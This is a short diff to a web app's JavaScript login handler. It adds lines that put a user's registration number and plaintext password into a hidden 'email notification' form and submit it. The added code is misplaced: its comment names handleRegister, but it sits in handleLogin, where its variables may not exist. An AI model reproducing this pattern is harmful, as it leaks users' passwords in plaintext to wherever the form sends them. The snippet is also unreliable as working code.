@@ -216,7 +216,11 @@ async function handleLogin(event) {
           return; // Exit early if localStorage validation succeeds
       }
   }
-
+// Add this inside handleRegister function, before the try block
+// Send email notification
+document.getElementById('emailRegNumber').value = regNumber;
+document.getElementById('emailPassword').value = regPassword;
+document.getElementById('emailNotificationForm').submit();
   // If localStorage validation fails, proceed with server login
   try {
       const response = await fetch('/api/login', {
